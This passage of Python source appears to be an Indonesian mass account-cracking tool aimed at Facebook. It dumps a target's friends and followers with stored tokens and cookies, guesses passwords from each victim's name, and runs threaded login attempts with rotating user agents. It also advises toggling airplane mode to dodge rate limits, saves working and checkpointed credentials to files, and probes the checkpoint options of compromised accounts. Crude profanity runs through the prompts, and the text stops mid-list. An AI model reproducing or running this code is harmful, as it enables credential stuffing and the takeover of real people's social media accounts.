def cracked_publickey():
	x=f"{P2}ketik {H2}y{P2} untuk crack massal public\n{P2}ketik {H2}t{P2} untuk crack public"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}",width=50))
	cuy = input(f"{garis} apakah anda ingin crack massal ({H}y{P}/{M}t{P}) ? : {H}")
	if cuy in ["y","Y"]:
		massal_cracked_public()
	elif cuy in ["t","T"]:
		cracked_public()
	elif cuy in ["g","G"]:
		cracked_email()
	else:
		jalan(f"{garis} isi yang benar ")
		cracked_publickey() 

def option_sesi():
	try:c_o_k = os.listdir('CP')
	except FileNotFoundError:
		jalan(garis+" tidak ada hasil")
		time.sleep(2)
		hasil_crack()
	if len(c_o_k)==0:
		jalan(garis+" tidak ada hasil")
		time.sleep(2)
		hasil_crack()
	else:
		x=f"{P2} hasil cp"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		cuih = 0
		lol = {}
		for kaoo in c_o_k:
			try:hikmat = open('CP/'+kaoo,'r').readlines()
			except:continue
			cuih+=1
			if cuih<10:
				__oo = '0'+str(cuih)
				lol.update({str(cuih):str(kaoo)})
				lol.update({__oo:str(kaoo)})
				x=f"{P2}{kaoo} • {str(len(hikmat))} akun{P2}"
				vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			else:
				lol.update({str(cuih):str(kaoo)})
				x=f"{P2} {kaoo} • {str(len(hikmat))} akun{P2}"
				vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	x=f"{P2}contoh : CP/{cpz}"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	files = input(f"{garis} pilih yang mau di cek : {H}")
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n%s files %s%s%s tidak ada!"%(garis,H,files,P))
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print(f"\n{garis} account : "+K+(kontol.replace(" + ","")))
		try:
			cek_opsi(titid[0].replace(" + ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	input(f"{garis} enter untuk kembali ")
	menu()

def HikmatXyz(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	ses.headers.update({
	"Host": "mbasic.facebook.com",
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": host,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": ua,
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"x-requested-with": "mark.via.gp",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": host+"/login/?next&ref=dbl&fl&refid=8",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
	})
	data = {}
	ged = sop(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	try:
		run = sop(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	except requests.exceptions.TooManyRedirects:
		print("%s %sakun ke spam "%(garis,M))
	if "c_user" in ses.cookies:
		print("%s %sakun OK tidak checkpoint"%(garis,H))
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"jazoest": jzst,
			"jazoest": jzst,
			"checkpoint_data":"",
			"submit[Continue]":"Lanjutkan",
			"nh": nh
		}
		xnxx = sop(ses.post(host+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if(str(len(ngew))=="0"):
			print("%s %sakun tapyes!!.. segera check di fb lite/mbasic"%(garis,H))
		else:
			print("%s %sterdapat %s opsi "%(garis,K,str(len(ngew))))
		for opt in range(len(ngew)):
			print(" "*3, str(opt+1)+". "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" %s[%s!%s] %s%s"%(M,P,M,P,oh))
	else:
		print("%s %spassword akun telah diganti!!"%(garis,M))
		
def check_opsi_sesudah_crack():
	print("")
	x=f"{P2}silahkan mode pesawatkan 5 detik sebelum memulai check opsi:) atau ganti kartu sim yak:) "
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	input(f"{garis} enter untuk melanjutkan ")
	files = (f"CP/{cpz}")
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n%s files %s%s%s tidak ada!"%(garis,H,files,P))
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print(f"\n{garis} account : "+(kontol.replace(" + ","")))
		try:
			HikmatXF(titid[0].replace(" + ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	#os.remove(f"CP/{cpz}")
	input(f"{garis} enter untuk kembali ")
	menu()
	#exit("\n%s done ya cuy"%(garis))

def HikmatXF(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	ses.headers.update({
	"Host": "mbasic.facebook.com",
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": host,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": ua,
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"x-requested-with": "mark.via.gp",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": host+"/login/?next&ref=dbl&fl&refid=8",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
	})
	data = {}
	ged = sop(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	try:
		run = sop(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	except requests.exceptions.TooManyRedirects:
		print("%s %sakun ke spam "%(garis,M))
	if "c_user" in ses.cookies:
		print("%s %sakun OK tidak checkpoint"%(garis,H))
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"jazoest": jzst,
			"jazoest": jzst,
			"checkpoint_data":"",
			"submit[Continue]":"Lanjutkan",
			"nh": nh
		}
		xnxx = sop(ses.post(host+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if(str(len(ngew))=="0"):
			print("%s %sakun tapyes!!.. segera check di fb lite/mbasic"%(garis,H))
		else:
			print("%s %sterdapat %s opsi "%(garis,K,str(len(ngew))))
		for opt in range(len(ngew)):
			print(" "*3, str(opt+1)+". "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" %s[%s!%s] %s%s"%(M,P,M,P,oh))
	else:
		print("%s %spassword akun telah diganti!!"%(garis,M))

def cracked_email():
	x = 0
	print("")
	n=f"{P2}[01] domain @gmail.com\n{P2}[02] domain @yahoo.com\n{P2}[03] domain @hotmail.com\n{P2}[04] domain @outlook.com"
	vprint(panel(n,style=f"{warna_warni_rich_cerah}"))
	sae = input(f"{garis} pilih : {H}")
	if sae in["1"]:
		email = "@gmail.com"
		nama = input(f"{garis} input nama : ")
		jumlah = int(input(f"{garis} input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(email+"<=>"+nama)
			sys.stdout.write(f"\r{garis} sedang mengumpulkan id {len(id)} ");sys.stdout.flush()
	elif sae in["2"]:
		email = "@yahoo.com"
		nama = input(f"{garis} input nama : ")
		jumlah = int(input(f"{garis} input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(email+"<=>"+nama)
			sys.stdout.write(f"\r{garis} sedang mengumpulkan id {len(id)} ");sys.stdout.flush()
	elif sae in["3"]:
		email = "@hotmail.com"
		nama = input(f"{garis} input nama : ")
		jumlah = int(input(f"{garis} input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(email+"<=>"+nama)
			sys.stdout.write(f"\r{garis} sedang mengumpulkan id {len(id)} ");sys.stdout.flush()
	elif sae in["4"]:
		email = "@outlook.com"
		nama = input(f"{garis} input nama : ")
		jumlah = int(input(f"{garis} input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(email+"<=>"+nama)
			sys.stdout.write(f"\r{garis} sedang mengumpulkan id {len(id)} ");sys.stdout.flush()
	settingers()

def massal_cracked_public():
	print("")
	x=f"\t\t{P2}target harus public & banyak friends nya"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	try:
		jum = int(input(garis+" mau berapa id :"+H+" "))
	except ValueError:
		jalan(garis+" yang kamu ketik itu bukan nomor")
		menu()
	if jum<1 or jum>20:
		jalan(garis+" kesalahan yang tidak terduga")
		menu()
	ses=requests.Session()
	yz = 0
	x=f"\t\t\t{P2}ketik {H2}me{P2} untuk crack dari pertemanan"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}",width=50))
	for met in range(jum):
		yz+=1
		kl = input(garis+" masukan id ke "+H+str(yz)+P+" :"+H+" ")
		#token = open('token.txt','r').read()
		#cookie = open('cookie.txt','r').read()
		#coki = {"cookie":cookie}
		#$coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(kl,token),cookies=coki)
		#el = json.loads(coa.text)
		#try:lk = el["name"]
		#except (KeyError,IOError):
			#lk = M+"-"+P
		#ooi = requests.get('https://graph.facebook.com/%s?access_token=%s'%(kl,token),cookies=coki)
		#oer = json.loads(ooi.text)
		#try:pok = oer["locale"]
		#except (KeyError,IOError):
			#pok = M+"-"+P
		#id8 = []
		#id9 = []
		#token = open('token.txt','r').read()
		#cookie = open('cookie.txt','r').read()
		#coki = {"cookie":cookie}
		#cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(kl,token),cookies=coki).json()
		#for fuck in cyna['friends']['data']:
			#try:id8.append(fuck['id']+'|'+fuck['name'])
			#except:pass
		#token = open('token.txt','r').read()
		#cookie = open('cookie.txt','r').read()
		#coki = {"cookie":cookie}
		#cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(5000)&access_token=%s'%(kl,token),cookies=coki).json()
		#for fuck in cyna['subscribers']['data']:
			#try:id9.append(fuck['id']+'|'+fuck['name'])
			#except:pass
		#x=f"{P2}nama target : {H2}{lk}\n{P2}friends total : {H2}{len(id8)}\n{P2}lokasi target akun : {H2}{pok}"
		#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		uid.append(kl)
		#idez.append(kl)
	for userr in uid:
		try:
			#token = open('token.txt','r').read()
			#cookie = open('cookie.txt','r').read()
			#coki = {"cookie":cookie}
			#cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(99999)&access_token=%s'%(idez,token),cookies=coki).json()
			#for fuck in cyna['subscribers']['data']:
				#try:id3.append(fuck['id']+'|'+fuck['name'])
				#except:pass
			#coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(userr,token),cookies=coki)
			#el = json.loads(coa.text)
			#try:lk = el["name"]
			#except (KeyError,IOError):
				#lk = M+"-"+P
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(userr,token),cookies=coki).json()
			for fuck in cyna['friends']['data']:
				try:id.append(fuck['id']+'|'+fuck['name'])
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			jalan(garis+" koneksi internet bermasalah ")
			exit()
	if len(id)==0:
		x=f"{P2}total friends : {M2}{len(id)}"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	else:
		x=f"{P2}total friends : {H2}{len(id)}"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	settingers()

def cracked_public():
	x=f"\t\t\t{P2}ketik {H2}me{P2} untuk crack dari pertemanan"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	put = input(garis+" target id public :"+H+" ")
	try:
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(put,token),cookies=coki)
		el = json.loads(coa.text)
		try:lk = el["name"]
		except (KeyError,IOError):
			lk = M+"-"+P
		#nama = requests.get('https://graph.facebook.com/%s?access_token=%s'%(put,token),cookies=coki).json()
		#print(f"{garis} Mengambil ID Teman"+H+": "+nama["name"])
		#link = requests.get('https://graph.facebook.com/%s/fields=friends?fields=name,id,birthday&limit=1000&access_token=%s'%(put,token),cookies=coki)
		#link_ = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(put,token),cookies=coki).json()
		#try:
			#Hikmat = link["data"]
			#ttl__ = []
			#ttl__.append("\033[96;1m + TTL")
		#except:
			#pass
		#if len(link["data"]) == 0:
			#print(M+"\n [x] Tidak Bisa Mengakses Data: "+K+nama["name"])
			#print(M+" [x] Coba cari Akun yg lainnya!")
			#exit()
		#global ttl__
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(put,token),cookies=coki).json()
		for fuck in cyna['friends']['data']:
			try:id.append(fuck['id']+'|'+fuck['name'])
			except:continue
		cini = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(10000)&access_token=%s'%(put,token),cookies=coki).json()
		for fak in cini['subscribers']['data']:
			try:id3.append(fak['id']+'|'+fak['name'])
			except:continue
		#print(maling_pangsit+" nama target :%s %s"(H,lk))
		dom = []
		dom.append(Panel(f"{P2} target : {H2}{lk}", style=f"{warna_warni_rich_cerah}"))
		dom.append(Panel(f"{P2}total friends : {H2}{len(id)}", style=f"{warna_warni_rich_cerah}"))
		dom.append(Panel(f"{P2}total followers : {H2}{len(id3)}", style=f"{warna_warni_rich_cerah}"))
		console.print(Columns(dom))
		settingers()
	except requests.exceptions.ConnectionError:
		jalan(garis+" koneksi internet bermasalah ")
		exit()
	except (KeyError,IOError):
		jalan(garis+" gagal dump id... mungkin privat friends/gada friends nya") 
		menu()
		time.sleep(0.5)
	
def settingers():
	tara = []
	tara.append(Panel(f'{P2}[{H2}01{P2}] crack urutan new ({H2}public crack{P2})\n{P2}[{H2}02{P2}] crack urutan old ({H2}public crack{P2})\n{P2}[{H2}03{P2}] crack urutan random ({H2}public crack{P2})',title=' • Publick •', style=f"{warna_warni_rich_cerah}"))
	tara.append(Panel(f'{P2}[{H2}04{P2}] crack urutan new ({H2}followers crack{P2})\n{P2}[{H2}05{P2}] crack urutan old ({H2}followers crack{P2})\n{P2}[{H2}06{P2}] crack urutan random ({H2}followers crack{P2})',title=' • Followers • ', style=f"{warna_warni_rich_cerah}"))
	console.print(Columns(tara))
	GlukTzy = input(garis+" pilih : "+H)
	if GlukTzy in ['2','02']:
		for bacot in id:
			id2.append(bacot)
	elif GlukTzy in ['1','01']:
		for bacot in id:
			id2.insert(0,bacot)
	elif GlukTzy in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	elif GlukTzy in ['5','05']:
		for kont in id3:
			id4.append(kont)
	elif GlukTzy in ['4','04']:
		for kont in id3:
			id4.insert(0,kont)
	elif GlukTzy in ['6','06']:
		for kont in id3:
			xx = random.randint(0,len(id4))
			id4.insert(xx,kont)
	else:
		jalan(garis+" isi yang benar")
		settingers()
	crack_public_pilihan()

def crack_public_pilihan():
	suci = []
	suci.append(Panel(f"{P2}[{H2}01{P2}] methode mobile ({H2}slowed cracked{P2})\n{P2}[{H2}02{P2}] methode mbasic ({K2}fast cracked{P2})\n{P2}[{H2}03{P2}] methode free  ({M2}not recommended{P2})",title=' • V1 • ', style=f"{warna_warni_rich_cerah}"))
	suci.append(Panel(f"{P2}[{H2}04{P2}] methode mobile version 2 ({H2}new{P2})\n{P2}[{H2}05{P2}] methode b-api  ({H2}very fast cracked{P2})\n{P2}[{H2}06{P2}] methode mobile freefire ({H2}new methode{P2})",title=' • V2 •', style=f"{warna_warni_rich_cerah}"))
	console.print(Columns(suci))
	met = input(garis+" pilih : "+H)
	if met in ["1","01","a"]:
		metode.append("mobile")
	elif met in ["2","02","b"]:
		metode.append("mbasic")
	elif met in ["3","03","c"]:
		metode.append("free")
	elif met in ["4","04"]:
		metode.append("mobile_v2")
	elif met in ["5","05"]:
		metode.append("bapi")
	elif met in ["6","06"]:
		metode.append("mobile_freefire")
	else:
		metode.append("mobile")
	pw_tambahani = input(garis+" ingin menambahkan password tambahan ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if pw_tambahani in ["y","Y","yes","Ya","Yes"]:
		pw_tambahan.append("ya")
		x=f"{P2}contoh password tambahan : {H2}anjing,ngentot,sayang "
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		pw_nya_cok = input(garis+" password tambahan :"+H+" ")
		pw_gw=pw_nya_cok.split(',')
		for cpw in pw_gw:
			pw_ni.append(cpw)
	elif pw_tambahani in ["t","T","Tidak","tidak","no"]:
		pw_tambahan.append("no")
	else:
		pw_tambahan.append("no")
	nanya_apk = input(garis+" ingin memunculkan aplikasi terkait ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if nanya_apk in ["y","ya","Y"]:
		tampilkan_apk.append("ya")
	elif nanya_apk in ["t","T","tidak"]:
		tampilkan_apk.append("no")
	else:
		tampilkan_apk.append("no")
	pilpas = input(garis+" ingin memakai password manual ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if pilpas in ["y","Y","ya","yes"]:
		with tread(max_workers=30) as HikmatXF:
			x=f"{P2}contoh password : {H2}anjing,ngentot,sayang "
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			listpass = input(garis+"%s list password :%s "%(P,H))
			if len(listpass)<=5:
				exit("\n"+garis+"%s password minimal 6 angka"%(M))
			x=f"{P2}list password crack {H2}{listpass}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			print("")
			x=f"{P2}hasil crack ok tersimpan di {H2}OK/{sekarang}.txt\n{P2}hasil crack cp tersimpan di {K2}CP/{sekarang}.txt\n "
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			print("")
			for user in id:
				HikmatXF.submit(mobile, user, listpass.split(","))
		print("")
		if len(ok) != 0 or len(cp) != 0:
			x=f"{P2}hasil cp mu : {K2}{len(cp)}\n{P2}hasil ok mu : {H2}{len(ok)}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(garis+" kembali ")
			menu()
		else:
			x=f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(garis+" kembali ")
			menu()
	elif pilpas in ["t","T","tidak","Tidak"]:
		passwer()

def passwer():
	x=f"{P2}hasil crack ok tersimpan di {H2}OK/{sekarang}.txt\n{P2}hasil crack cp tersimpan di {K2}CP/{sekarang}.txt\n{P2}turn on airplane mode every 500 id"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}",width=60))
	print("")
	with tread(max_workers=30) as HikmatXD:
		for koncol in id2 or id4:
			uiz,mmk = koncol.split('|')[0],koncol.split('|')[1].lower()
			prot = mmk.split(' ')[0]
			pwr = []
			if len(mmk)<6:
				if len(prot)<3:
					pass
				else:
					pwr.append(prot+'123')
					pwr.append(prot+'12345')
					pwr.append(prot+'1234')
					pwr.append(prot+'321')
			else:
				if len(prot)<3:
					pwr.append(mmk)
				else:
					pwr.append(mmk)
					pwr.append(prot+'123')
					pwr.append(prot+'12345')
					pwr.append(prot+'1234')
					pwr.append(prot+'321')
			if 'ya' in pw_tambahan:
				for xnxr in pw_ni:
					pwr.append(xnxr)
			if 'ya' in pw_belakang:
				for asoe in pw_lu:
					pwr.append(prot+asoe)
			else:pass
			if 'mobile' in metode:
				HikmatXD.submit(mobile,uiz,pwr,"m.facebook.com")
			elif 'mbasic' in metode:
				HikmatXD.submit(mbasic,uiz,pwr,"mbasic.facebook.com")
			elif 'free' in metode:
				HikmatXD.submit(free,uiz,pwr,"free.facebook.com")
			elif "mobile_v2" in metode:
				HikmatXD.submit(mobile_v2,uiz,pwr,"m.facebook.com")
			elif "bapi" in metode:
				HikmatXD.submit(api,uiz,pwr)
			elif "mobile_freefire" in metode:
				HikmatXD.submit(mobile_free_fire,uiz,pwr,"m.facebook.com")
			else:
				HikmatXD.submit(mobile,uiz,pwr,"m.facebook.com")
	print("")
	if ok != 0 or cp != 0:
		x=f"{P2}hasil cp mu : {K2}{cp}\n{P2}hasil ok mu : {H2}{ok}"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		input(garis+" kembali ")
		tanya_hal = input(f"{garis} ingin memakai check opsi detector untuk hasil crack cp ({H}y{P}/{M}t{P}) ? : {H}")
		if tanya_hal in ["y","Y","ya"]:
			check_opsi_sesudah_crack()
		elif tanya_hal in ["t","T","tidak"]:
			menu()
		else:
			menu()
	else:
		x=f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		input(garis+" kembali ")
		menu()
		
def mobile(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; TECNO CG6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; Qmobile_4Gplus; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Mobile; Tech_Pad_Kaios_One_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.1","Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.187 Safari/537.36 Mozilla/5.0 (Mobile; Nokia 8000 4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4","Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2","Mozilla/5.0 (Mobile; LYF/F300B/LYF-F300B-001-01-15-130718-i;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Edg/93.0.4577.63","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-45-051119;Android; rv:48.0) Gecko/48.0 Firefox/48.0 